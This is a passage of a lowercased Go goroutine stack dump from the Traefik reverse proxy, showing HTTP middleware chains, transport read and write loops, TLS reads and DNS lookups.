github.com/containous/traefik/vendor/github.com/nytimes/gziphandler.gziphandlerwithopts.func1.1( , , ) /go/src/github.com/containous/traefik/vendor/github.com/nytimes/gziphandler/gzip.go:286 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:1947 +
github.com/containous/traefik/middlewares.(*compress).servehttp( , , , , ) /go/src/github.com/containous/traefik/middlewares/compress.go:21 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/thoas/stats.(*stats).servehttp( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:64 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:1947 +
github.com/containous/traefik/middlewares.negronirecoverhandler.func1( , , , ) /go/src/github.com/containous/traefik/middlewares/recover.go:23 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
net/http.serverhandler.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2694 +
net/http.(*conn).serve( , , ) /usr/local/go/src/net/http/server.go:1830 +
created by net/http.(*server).serve /usr/local/go/src/net/http/server.go:2795 + goroutine 1132 [select]:
net/http.(*persistconn).writeloop( ) /usr/local/go/src/net/http/transport.go:1822 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1238 + goroutine 246 [select]:
net/http.(*persistconn).writeloop( ) /usr/local/go/src/net/http/transport.go:1822 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1238 + goroutine 243 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
net/http.(*persistconn).read( , , , , , , ) /usr/local/go/src/net/http/transport.go:1453 +
bufio.(*reader).fill( ) /usr/local/go/src/bufio/bufio.go:100 +
bufio.(*reader).peek( , , , , , , ) /usr/local/go/src/bufio/bufio.go:132 +
net/http.(*persistconn).readloop( ) /usr/local/go/src/net/http/transport.go:1601 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1237 + goroutine 244 [select]:
net/http.(*persistconn).writeloop( ) /usr/local/go/src/net/http/transport.go:1822 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1238 + goroutine 221 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
net/http.(*persistconn).read( , , , , , , ) /usr/local/go/src/net/http/transport.go:1453 +
bufio.(*reader).fill( ) /usr/local/go/src/bufio/bufio.go:100 +
bufio.(*reader).peek( , , , , , , ) /usr/local/go/src/bufio/bufio.go:132 +
net/http.(*persistconn).readloop( ) /usr/local/go/src/net/http/transport.go:1601 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1237 + goroutine 1009 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
net/http.(*persistconn).read( , , , , , , ) /usr/local/go/src/net/http/transport.go:1453 +
bufio.(*reader).fill( ) /usr/local/go/src/bufio/bufio.go:100 +
bufio.(*reader).peek( , , , , , , ) /usr/local/go/src/bufio/bufio.go:132 +
net/http.(*persistconn).readloop( ) /usr/local/go/src/net/http/transport.go:1601 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1237 + goroutine 222 [select]:
net/http.(*persistconn).writeloop( ) /usr/local/go/src/net/http/transport.go:1822 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1238 + goroutine 944 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
net/http.(*persistconn).read( , , , , , , ) /usr/local/go/src/net/http/transport.go:1453 +
bufio.(*reader).fill( ) /usr/local/go/src/bufio/bufio.go:100 +
bufio.(*reader).peek( , , , , , , ) /usr/local/go/src/bufio/bufio.go:132 +
net/http.(*persistconn).readloop( ) /usr/local/go/src/net/http/transport.go:1601 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1237 + goroutine 1811 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
crypto/tls.(*block).readfromuntil( , , , , , ) /usr/local/go/src/crypto/tls/conn.go:493 +
crypto/tls.(*conn).readrecord( , , , ) /usr/local/go/src/crypto/tls/conn.go:595 +
crypto/tls.(*conn).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:1156 +
net/http.(*persistconn).read( , , , , , , ) /usr/local/go/src/net/http/transport.go:1453 +
bufio.(*reader).fill( ) /usr/local/go/src/bufio/bufio.go:100 +
bufio.(*reader).peek( , , , , , , ) /usr/local/go/src/bufio/bufio.go:132 +
net/http.(*persistconn).readloop( ) /usr/local/go/src/net/http/transport.go:1601 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1237 + goroutine 995 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
net/http.(*persistconn).read( , , , , , , ) /usr/local/go/src/net/http/transport.go:1453 +
bufio.(*reader).fill( ) /usr/local/go/src/bufio/bufio.go:100 +
bufio.(*reader).peek( , , , , , , ) /usr/local/go/src/bufio/bufio.go:132 +
net/http.(*persistconn).readloop( ) /usr/local/go/src/net/http/transport.go:1601 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1237 + goroutine 1010 [select]:
net/http.(*persistconn).writeloop( ) /usr/local/go/src/net/http/transport.go:1822 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1238 + goroutine 1128 [runnable]:
context.withvalue( , , , , , , , ) /usr/local/go/src/context/context.go:474 +
github.com/containous/traefik/vendor/github.com/containous/mux.contextset( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/context_native.go:19 +
github.com/containous/traefik/vendor/github.com/containous/mux.setvars( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:412 +
github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:118 +
net/http.serverhandler.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2694 +
net/http.(*conn).serve( , , ) /usr/local/go/src/net/http/server.go:1830 +
created by net/http.(*server).serve /usr/local/go/src/net/http/server.go:2795 + goroutine 1211 [select]:
net/http.(*persistconn).writeloop( ) /usr/local/go/src/net/http/transport.go:1822 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1238 + goroutine 985 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
net/http.(*persistconn).read( , , , , , , ) /usr/local/go/src/net/http/transport.go:1453 +
bufio.(*reader).fill( ) /usr/local/go/src/bufio/bufio.go:100 +
bufio.(*reader).peek( , , , , , , ) /usr/local/go/src/bufio/bufio.go:132 +
net/http.(*persistconn).readloop( ) /usr/local/go/src/net/http/transport.go:1601 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1237 + goroutine 986 [select]:
net/http.(*persistconn).writeloop( ) /usr/local/go/src/net/http/transport.go:1822 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1238 + goroutine 1127 [select]:
net/http.(*persistconn).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:2033 +
net/http.(*transport).roundtrip( , , , , ) /usr/local/go/src/net/http/transport.go:422 +
github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.errorhandlingroundtripper.roundtrip( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:150 +
net/http/httputil.(*reverseproxy).servehttp( , , , ) /usr/local/go/src/net/http/httputil/reverseproxy.go:193 +
github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*httpforwarder).servehttp( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:493 +
github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*forwarder).servehttp( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:263 +
github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin.(*roundrobin).servehttp( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin/rr.go:129 +
github.com/containous/traefik/middlewares.(*emptybackendhandler).servehttp( , , , ) /go/src/github.com/containous/traefik/middlewares/empty_backend_handler.go:29 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:1947 +
github.com/containous/traefik/middlewares/auth.createauthbasichandler.func1( , , , ) /go/src/github.com/containous/traefik/middlewares/auth/authenticator.go:99 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
github.com/containous/traefik/middlewares/auth.(*authenticator).servehttp( , , , , ) /go/src/github.com/containous/traefik/middlewares/auth/authenticator.go:138 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
github.com/containous/traefik/middlewares.(*handlerswitcher).servehttp( , , , ) /go/src/github.com/containous/traefik/middlewares/handlerswitcher.go:24 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:1947 +
github.com/containous/traefik/vendor/github.com/nytimes/gziphandler.gziphandlerwithopts.func1.1( , , ) /go/src/github.com/containous/traefik/vendor/github.com/nytimes/gziphandler/gzip.go:286 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:1947 +
github.com/containous/traefik/middlewares.(*compress).servehttp( , , , , ) /go/src/github.com/containous/traefik/middlewares/compress.go:21 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/thoas/stats.(*stats).servehttp( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:64 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
net/http.handlerfunc.servehttp( , , , ) /usr/local/go/src/net/http/server.go:1947 +
github.com/containous/traefik/middlewares.negronirecoverhandler.func1( , , , ) /go/src/github.com/containous/traefik/middlewares/recover.go:23 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
net/http.serverhandler.servehttp( , , , ) /usr/local/go/src/net/http/server.go:2694 +
net/http.(*conn).serve( , , ) /usr/local/go/src/net/http/server.go:1830 +
created by net/http.(*server).serve /usr/local/go/src/net/http/server.go:2795 + goroutine 1789 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
crypto/tls.(*block).readfromuntil( , , , , , ) /usr/local/go/src/crypto/tls/conn.go:493 +
crypto/tls.(*conn).readrecord( , , , ) /usr/local/go/src/crypto/tls/conn.go:595 +
crypto/tls.(*conn).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:1156 +
net/http.(*persistconn).read( , , , , , , ) /usr/local/go/src/net/http/transport.go:1453 +
bufio.(*reader).fill( ) /usr/local/go/src/bufio/bufio.go:100 +
bufio.(*reader).peek( , , , , , , ) /usr/local/go/src/bufio/bufio.go:132 +
net/http.(*persistconn).readloop( ) /usr/local/go/src/net/http/transport.go:1601 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1237 + goroutine 1204 [select]:
net/http.(*persistconn).writeloop( ) /usr/local/go/src/net/http/transport.go:1822 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1238 + goroutine 1245 [runnable]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
net/http.(*persistconn).read( , , , , , , ) /usr/local/go/src/net/http/transport.go:1453 +
bufio.(*reader).fill( ) /usr/local/go/src/bufio/bufio.go:100 +
bufio.(*reader).peek( , , , , , , ) /usr/local/go/src/bufio/bufio.go:132 +
net/http.(*persistconn).readloop( ) /usr/local/go/src/net/http/transport.go:1601 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1237 + goroutine 1131 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
net/http.(*persistconn).read( , , , , , , ) /usr/local/go/src/net/http/transport.go:1453 +
bufio.(*reader).fill( ) /usr/local/go/src/bufio/bufio.go:100 +
bufio.(*reader).peek( , , , , , , ) /usr/local/go/src/bufio/bufio.go:132 +
net/http.(*persistconn).readloop( ) /usr/local/go/src/net/http/transport.go:1601 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1237 + goroutine 1210 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
net/http.(*persistconn).read( , , , , , , ) /usr/local/go/src/net/http/transport.go:1453 +
bufio.(*reader).fill( ) /usr/local/go/src/bufio/bufio.go:100 +
bufio.(*reader).peek( , , , , , , ) /usr/local/go/src/bufio/bufio.go:132 +
net/http.(*persistconn).readloop( ) /usr/local/go/src/net/http/transport.go:1601 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1237 + goroutine 1777 [select]:
net.(*resolver).lookupipaddr( , , , , , , , , , ) /usr/local/go/src/net/lookup.go:212 +
net.(*resolver).internetaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/ipsock.go:293 +
net.(*resolver).resolveaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:193 +
net.(*dialer).dialcontext( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:375 +
net.(*dialer).dial( , , , , , , , , ) /usr/local/go/src/net/dial.go:320 +
net.(*dialer).dial-fm( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:25 +
net/http.(*transport).dial( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:901 +
net/http.(*transport).dialconn( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:1143 +
net/http.(*transport).getconn.func4( , , , , ) /usr/local/go/src/net/http/transport.go:957 +
created by net/http.(*transport).getconn /usr/local/go/src/net/http/transport.go:956 + goroutine 1203 [runnable]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
net/http.(*persistconn).read( , , , , , , ) /usr/local/go/src/net/http/transport.go:1453 +
bufio.(*reader).fill( ) /usr/local/go/src/bufio/bufio.go:100 +
bufio.(*reader).peek( , , , , , , ) /usr/local/go/src/bufio/bufio.go:132 +
net/http.(*persistconn).readloop( ) /usr/local/go/src/net/http/transport.go:1601 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1237 + goroutine 1246 [select]:
net/http.(*persistconn).writeloop( ) /usr/local/go/src/net/http/transport.go:1822 +
created by net/http.(*transport).dialconn /usr/local/go/src/net/http/transport.go:1238 + goroutine 1821 [select]:
net.(*resolver).lookupipaddr( , , , , , , , , , ) /usr/local/go/src/net/lookup.go:212 +
net.(*resolver).internetaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/ipsock.go:293 +
net.(*resolver).resolveaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:193 +
net.(*dialer).dialcontext( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:375 +
net.(*dialer).dial( , , , , , , , , ) /usr/local/go/src/net/dial.go:320 +
net.(*dialer).dial-fm( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:25 +
net/http.(*transport).dial( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:901 +
net/http.(*transport).dialconn( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:1143 +
net/http.(*transport).getconn.func4( , , , , ) /usr/local/go/src/net/http/transport.go:957 +
created by net/http.(*transport).getconn /usr/local/go/src/net/http/transport.go:956 + goroutine 1833 [select]:
net.(*resolver).lookupipaddr( , , , , , , , , , ) /usr/local/go/src/net/lookup.go:212 +
net.(*resolver).internetaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/ipsock.go:293 +
net.(*resolver).resolveaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:193 +
net.(*dialer).dialcontext( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:375 +
net.(*dialer).dial( , , , , , , , , ) /usr/local/go/src/net/dial.go:320 +
net.(*dialer).dial-fm( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:25 +
net/http.(*transport).dial( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:901 +
net/http.(*transport).dialconn( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:1143 +
net/http.(*transport).getconn.func4( , , , , ) /usr/local/go/src/net/http/transport.go:957 +
created by net/http.(*transport).getconn /usr/local/go/src/net/http/transport.go:956 + goroutine 1831 [runnable]:
crypto/aes.(*gcmasm).seal( , , , , , , , , , , ...) /usr/local/go/src/crypto/aes/aes_gcm.go:98 +
crypto/tls.(*fixednonceaead).seal( , , , , , , , , , , ...) /usr/local/go/src/crypto/tls/cipher_suites.go:175 +
crypto/tls.(*halfconn).encrypt( , , , ) /usr/local/go/src/crypto/tls/conn.go:425 +
crypto/tls.(*conn).writerecordlocked( , , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:930 +
crypto/tls.(*conn).write( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:1090 +
bufio.(*writer).flush( , , ) /usr/local/go/src/bufio/bufio.go:573 +
net/http.(*http2bufferedwriter).flush( , , ) /usr/local/go/src/net/http/h2_bundle.go:3493 +
net/http.(*http2serverconn).flush( , , ) /usr/local/go/src/net/http/h2_bundle.go:4247 +
net/http.http2flushframewriter.writeframe( , , , ) /usr/local/go/src/net/http/h2_bundle.go:8906 +
net/http.(*http2serverconn).writeframeasync( , , , , ) /usr/local/go/src/net/http/h2_bundle.go:4420 +
created by net/http.(*http2serverconn).startframewrite /usr/local/go/src/net/http/h2_bundle.go:4800 + goroutine 1820 [select]:
net.(*resolver).lookupipaddr( , , , , , , , , , ) /usr/local/go/src/net/lookup.go:212 +
net.(*resolver).internetaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/ipsock.go:293 +
net.(*resolver).resolveaddrlist( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:193 +
net.(*dialer).dialcontext( , , , , , , , , , , ...) /usr/local/go/src/net/dial.go:375 +
net.(*dialer).dial( , , , , , , , , ) /usr/local/go/src/net/dial.go:320 +
net.(*dialer).dial-fm( , , , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http.go:25 +
net/http.(*transport).dial( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:901 +
net/http.(*transport).dialconn( , , , , , , , , , , ...) /usr/local/go/src/net/http/transport.go:1143 +
net/http.(*transport).getconn.func4( , , , , ) /usr/local/go/src/net/http/transport.go:957 +
created by net/http.(*transport).getconn /usr/local/go/src/net/http/transport.go:956 + goroutine 1802 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).read( , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:157 +
net.(*netfd).read( , , , , , , ) /usr/local/go/src/net/fd_unix.go:202 +
net.(*conn).read( , , , , , , ) /usr/local/go/src/net/net.go:176 +
crypto/tls.(*block).readfromuntil( , , , , , ) /usr/local/go/src/crypto/tls/conn.go:493 +
crypto/tls.(*conn).readrecord( , , , ) /usr/local/go/src/crypto/tls/conn.go:595 +
crypto/tls.(*conn).read( , , , , , , ) /usr/local/go/src/crypto/tls/conn.go:1156 +
net/http.(*connreader).backgroundread( ) /usr/local/go/src/net/http/server.go:668 +
created by net/http.(*connreader).startbackgroundread /usr/local/go/src/net/http/server.go:664 + goroutine 1832 [select]:
